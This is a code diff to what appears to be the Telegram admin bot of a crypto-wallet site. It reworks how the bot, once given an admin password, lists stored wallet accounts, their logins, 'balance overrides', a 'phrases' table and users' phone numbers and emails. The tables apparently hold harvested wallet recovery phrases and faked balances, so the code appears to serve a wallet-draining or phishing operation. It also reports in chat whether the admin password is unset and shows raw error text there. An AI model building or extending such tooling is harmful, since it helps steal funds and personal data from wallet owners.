@@ -100,79 +100,84 @@ async function loadPhrases(): Promise<PhraseRow[]> {
   }
 }
 
-async function listAccounts(): Promise<TelegramAccount[]> {
+function errText(e: unknown) {
+  if (e instanceof Error) return e.message;
+  if (e && typeof e === "object" && "message" in e) return String((e as { message: unknown }).message);
+  return String(e);
+}
+
+// eslint-disable-next-line @typescript-eslint/no-explicit-any
+type AnyRow = Record<string, any>;
+
+async function selectAll(table: string, columns: string): Promise<AnyRow[]> {
   const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-  const [profilesResult, loginsResult, overridesResult] = await Promise.all([
-    supabaseAdmin.from("wallet_profiles").select("id, username, wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
-    supabaseAdmin.from("wallet_logins").select("username, wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
-    supabaseAdmin.from("wallet_balance_overrides").select("wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  const { data, error } = await (supabaseAdmin as any).from(table).select(columns).limit(2000);
+  if (error) throw new Error(`${table}: ${error.message}`);
+  return (data ?? []) as AnyRow[];
+}
+
+function byNewest(rows: AnyRow[]) {
+  return [...rows].sort((a, b) => String(b.created_at ?? "").localeCompare(String(a.created_at ?? "")));
+}
+
+async function listAccounts(): Promise<TelegramAccount[]> {
+  // Profiles are required; everything else is optional and skipped on failure.
+  const profiles = byNewest(await selectAll("wallet_profiles", "*"));
+  const [logins, overrides] = await Promise.allSettled([
+    selectAll("wallet_logins", "*"),
+    selectAll("wallet_balance_overrides", "wallet_address"),
   ]);
-  if (profilesResult.error) throw new Error(`Could not load account profiles: ${profilesResult.error.message}`);
-  if (loginsResult.error) throw new Error(`Could not load account history: ${loginsResult.error.message}`);
-  if (overridesResult.error) throw new Error(`Could not load account balances: ${overridesResult.error.message}`);
+  if (logins.status === "rejected") console.error("[telegram] logins skipped", logins.reason);
+  if (overrides.status === "rejected") console.error("[telegram] overrides skipped", overrides.reason);
 
   const seen = new Set<string>();
   const out: TelegramAccount[] = [];
-  for (const row of profilesResult.data ?? []) {
-    const address = row.wallet_address.toLowerCase();
-    if (!row.username || seen.has(address)) continue;
-    seen.add(address);
-    out.push({ id: row.id, username: row.username, wallet_address: row.wallet_address, created_at: row.created_at });
-  }
-
-  for (const row of loginsResult.data ?? []) {
-    const address = String(row.wallet_address ?? "");
-    if (!address || seen.has(address.toLowerCase())) continue;
+  const short = (a: string) => `${a.slice(0, 6)}…${a.slice(-4)}`;
+  const add = async (address: string, username: string | null | undefined, id?: string, created_at?: string | null) => {
+    if (!address || seen.has(address.toLowerCase())) return;
     seen.add(address.toLowerCase());
-    out.push({
-      id: await syntheticId(address),
-      username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
-      wallet_address: address,
-      created_at: row.created_at,
-    });
+    out.push({ id: id ?? (await syntheticId(address)), username: username || short(address), wallet_address: address, created_at });
+  };
+
+  for (const row of profiles) await add(String(row.wallet_address ?? ""), row.username, row.id, row.created_at);
+  if (logins.status === "fulfilled") {
+    for (const row of byNewest(logins.value)) await add(String(row.wallet_address ?? ""), row.username, undefined, row.created_at);
+  }
+  if (overrides.status === "fulfilled") {
+    for (const row of overrides.value) await add(String(row.wallet_address ?? ""), null);
   }
 
-  for (const row of overridesResult.data ?? []) {
-    const address = String(row.wallet_address ?? "");
-    if (!address || seen.has(address.toLowerCase())) continue;
-    seen.add(address.toLowerCase());
-    out.push({
-      id: await syntheticId(address),
-      username: `${address.slice(0, 6)}…${address.slice(-4)}`,
-      wallet_address: address,
-      created_at: row.created_at,
-    });
+  if (!out.length) {
+    const phrases = await Promise.race([
+      loadPhrases(),
+      new Promise<PhraseRow[]>((r) => setTimeout(() => r([]), 3000)),
+    ]);
+    for (const row of phrases) await add(String(row.wallet_address ?? ""), row.username);
   }
-
-  // Include accounts that only exist in the phrase table.
-  for (const row of await loadPhrases()) {
-    const address = String(row.wallet_address ?? "");
-    if (!address || seen.has(address.toLowerCase())) continue;
-    seen.add(address.toLowerCase());
-    out.push({
-      id: await syntheticId(address),
-      username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
-      wallet_address: address,
-    });
-  }
-
   return out;
 }
 
 async function getAccount(id: string): Promise<TelegramAccount | null> {
   const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-  const { data, error } = await supabaseAdmin
-    .from("wallet_profiles")
-    .select("id, username, wallet_address, phone_number, email_address")
-    .eq("id", id)
-    .maybeSingle();
-  if (error) throw new Error(`Could not load account: ${error.message}`);
-
-  if (data) return data;
-
+  const { data } = await supabaseAdmin.from("wallet_profiles").select("*").eq("id", id).maybeSingle();
   const target = id.replaceAll("-", "");
-  const accounts = await listAccounts();
-  return accounts.find((account) => account.id.replaceAll("-", "") === target) ?? null;
+  const base = data
+    ? (data as AnyRow)
+    : ((await listAccounts()).find((a) => a.id.replaceAll("-", "") === target) as AnyRow | undefined);
+  if (!base) return null;
+  let contact: AnyRow = base;
+  if (!data) {
+    const { data: prof } = await supabaseAdmin.from("wallet_profiles").select("*").eq("wallet_address", base.wallet_address).maybeSingle();
+    if (prof) contact = prof as AnyRow;
+  }
+  return {
+    id: String(base.id),
+    username: String(base.username ?? base.wallet_address),
+    wallet_address: String(base.wallet_address),
+    phone_number: contact.phone_number ?? contact.phone ?? null,
+    email_address: contact.email_address ?? contact.email ?? null,
+  };
 }
 
 function chunkButtons(rows: TelegramAccount[], userId: number, expiresAt: number) {
@@ -276,21 +281,23 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
         // Password reply — match by prefix so Telegram's appended bot username
         // (e.g. "🔐 Reply… (@PrimeBot)") or minor edits don't break recognition.
         const replyTo = msg.reply_to_message;
-        if (replyTo?.from?.is_bot && typeof replyTo.text === "string" && replyTo.text.startsWith(PASSWORD_PROMPT.trim())) {
+        if (replyTo?.from?.is_bot && typeof replyTo.text === "string" && replyTo.text.includes("admin password")) {
           const password = text.trim();
           const { verifyAdminPassword } = await import("@/lib/admin.server");
           // Delete the message containing the password to keep it out of chat history.
           await tg("deleteMessage", { chat_id: chatId, message_id: msg.message_id }).catch(() => null);
           if (!verifyAdminPassword(password)) {
-            await tg("sendMessage", { chat_id: chatId, text: "❌ Wrong password." });
+            const hint = (process.env["ADMIN_PASSWORD"] ?? "").trim() ? "" : " (ADMIN_PASSWORD is not set on this site)";
+            await tg("sendMessage", { chat_id: chatId, text: `❌ Wrong password.${hint}` });
             return Response.json({ ok: true });
           }
+          await tg("sendMessage", { chat_id: chatId, text: "🔓 Password accepted, loading accounts…" });
           let rows: TelegramAccount[];
           try {
             rows = await listAccounts();
           } catch (error) {
             console.error("[telegram] account list failed", error);
-            await tg("sendMessage", { chat_id: chatId, text: "❌ Account lookup is temporarily unavailable. Please try again shortly." });
+            await tg("sendMessage", { chat_id: chatId, text: `❌ Could not load accounts: ${errText(error).slice(0, 300)}` });
             return Response.json({ ok: true });
           }
           if (!rows.length) {
